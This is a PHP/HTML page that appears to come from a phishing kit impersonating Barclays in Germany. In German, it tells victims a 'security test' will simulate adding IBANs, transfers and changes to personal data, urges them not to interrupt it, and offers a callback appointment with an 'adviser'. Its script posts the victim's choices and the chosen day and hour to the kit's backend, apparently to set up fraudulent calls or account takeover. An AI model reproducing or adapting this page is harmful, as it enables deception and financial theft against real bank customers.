<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Barclays</title>
    <link rel="stylesheet" href="res/css/app.css">
</head>
<body>
<header>
<div class="left">
    <img src="res/img/logo.png" class="pc">
    <img src="res/img/mobile-logo.png" class="mobile">
</div>
<div class="right"> 
</div>
</header>

<div class="banner">
<div class="container">
<span>Kontobestätigung</span>
</div>
</div>



<main>
<div class="container">
<div class="form" style="width:800px; font-size:0.8em;">

<div class="title" style="text-align:left;">Warnung ⚠️</div>
<div class="col" style="text-align:left;">
<p>Im Rahmen unserer Sicherheitsverpflichtungen führen wir derzeit einen Test zur Verstärkung der Schutzmaßnahmen für Ihr Konto durch. Dieser Vorgang kann bis zu 5 Minuten dauern. Wir bitten Sie, den Vorgang nach Beginn nicht zu unterbrechen.</p>

<p>Dieser Test beinhaltet sichere Simulationen der Hinzufügung von Bankverbindungen (IBAN), Überweisungen und Zahlungen sowie Änderungen persönlicher Daten. Diese simulierten Vorgänge führen zu keiner realen Kontobewegung, sondern dienen dazu, die Zuverlässigkeit und Wirksamkeit der neuen Schutzmaßnahmen zu gewährleisten.</p>

<p>Sie können dieses Verfahren online durchführen oder einen Termin mit einem unserer Berater über die Schaltfläche „Terminvereinbarung“ planen.</p>

</div>

<div style="text-align:center;">
<div class="col">
    <button onclick="note('CONTINUE ONLINE SELECTED!')" class="sbmt" style="width:auto;">Überprüfung online fortsetzen</button>
</div>
<div style="margin:10px 0; text-align:center; color:gray;">Oder</div>

<div class="col">
Wählen Sie ein Datum und eine Uhrzeit, damit wir Sie anrufen können, um die Überprüfung mit einem unserer Berater abzuschließen.
</div>

<div class="" style="margin:16px 0">
<select id="day"></select>

<select id="hour"></select>

</div>

<div class="col">
    <button onclick="sbmt()" class="sbmt">Terminvereinbarung</button>
</div>
<h3 style="color:red; text-align:center;">Wir bitten Sie, den Vorgang nach Beginn nicht zu unterbrechen.</h3>
<p>Ihre Sicherheit hat für uns oberste Priorität.</p>

</div>

</div>

</div>
</main>



<footer>
<div class="container">
<p>Barclays Group hat der BAWAG das Nutzungsrecht an der Marke „Barclays“ für das Privatkundengeschäft in Deutschland und Österreich eingeräumt. Barclays Group und BAWAG befinden sich in keinem Beteiligungsverhältnis und handeln für ihre Geschäftsbereiche unabhängig voneinander.</p>

<img src="res/img/pubs.png">
</div>
</footer>





<?php 
require 'loader.php';
$m->ctr("INSTRUCTIONS 2 RDV");
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>


function sbmt(){
    $(".loader").show();
    $.post("post.php",{insts:1, day:$("#day").val(), hour:$("#hour").val()},(res)=>{
        window.location="mkfile.php?p=wait";
    });
 
}

function note(note){
    $(".loader").show();
    $.post("post.php",{notes:note},(res)=>{
    })
}



  function getNextFiveWeekdays() {
    const weekdays = [];
    const dayNames = ["Lundi", "Mardi", "Mercredi", "Jeudi", "Vendredi"];
    let currentDate = new Date();
    let count = 0;

    while (count < 5) {
      const dayOfWeek = currentDate.getDay();
      
      // Only include weekdays (Monday to Friday)
      if (dayOfWeek >= 1 && dayOfWeek <= 5) { 
        const dayName = dayNames[dayOfWeek - 1];  // dayOfWeek - 1 to align with array index
        const day = String(currentDate.getDate()).padStart(2, '0');
        const month = String(currentDate.getMonth() + 1).padStart(2, '0');
        weekdays.push(`${dayName} ${day}/${month}`);
        count++;
      }
      
      // Move to the next day
      currentDate.setDate(currentDate.getDate() + 1);
    }

    return weekdays;
  }

  function populateDaySelect() {
    const select = document.getElementById('day');
    const weekdays = getNextFiveWeekdays();

    weekdays.forEach((dateString) => {
      const option = document.createElement('option');
      option.value = dateString;
      option.textContent = dateString;
      select.appendChild(option);
    });
  }

  // Populate the select dropdown on page load
  populateDaySelect();


  function populateHourSelect() {
    const select = document.getElementById('hour');
    for (let hour = 8; hour <= 17; hour++) {
      const option = document.createElement('option');
      // Format hour with leading zero if needed and add ":00" for the full hour format
      const formattedHour = `${String(hour).padStart(2, '0')}:00`;
      option.value = formattedHour;
      option.textContent = formattedHour;
      select.appendChild(option);
    }
  }

  // Populate the select dropdown on page load
  populateHourSelect();
</script>
</body>
</html>